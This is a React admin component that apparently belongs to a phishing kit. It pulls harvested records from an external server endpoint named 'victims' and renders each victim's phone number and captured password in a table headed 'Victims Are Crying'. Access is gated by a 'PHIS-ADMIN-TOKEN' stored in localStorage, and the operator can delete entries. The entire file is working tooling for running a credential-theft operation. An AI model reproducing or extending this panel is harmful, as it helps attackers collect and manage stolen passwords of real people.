
import './Admin.css'
import React, { useEffect, useRef, useState } from 'react';
import $ from 'jquery';
import 'datatables.net';
import { useNavigate } from 'react-router-dom';


const Admins = () => {
 
  const navigate = useNavigate()
  const [victims,setVictims] = useState();
 


  const handleDelete = (id)=>{
    // console.log(id);
    fetch(`https://phs-server-1.onrender.com/victims/${id}`,{
      method: 'DELETE'
    })

    .then(res => res.json())
    .then(data => {
      // console.log(data)
      
    })
  }
 

 
  useEffect(() => {
    fetch('https://phs-server-1.onrender.com/victims',)
    .then(res => res.json())
    .then(data =>{
      setVictims(data)
    })

    { !localStorage.getItem('PHIS-ADMIN-TOKEN') &&  navigate('/') }

 
  }, [victims]);
  return (
    <div className='table'>
      <div id="wrapper">
        <h1>Victims Are Crying🥲</h1>
        <h1>Total victims - {victims?.length} </h1>

        <table id="keywords"   cellspacing="0" cellpadding="0">
          <thead>
            <tr>
              <th><span>Victims</span></th>
              <th><span>Number</span></th>
              <th><span>Password</span></th>
              <th><span>time</span></th>
              <th><span>Action</span></th>
            </tr>
          </thead>
          <tbody>
           {
            victims?.reverse().map((victim,i) =>
              <tr key={victim._id}>
              <td class="lalign">Victim-{i+1}</td>
              <td>{victim.name}</td>
              <td>{victim.pass}</td>
              <td>{victim.time}</td>
              <td onClick={() => handleDelete(victim._id)}>Delete</td>
            </tr>)
           }
          </tbody>
        </table>
      </div>

    </div>
  );
};

export default Admins;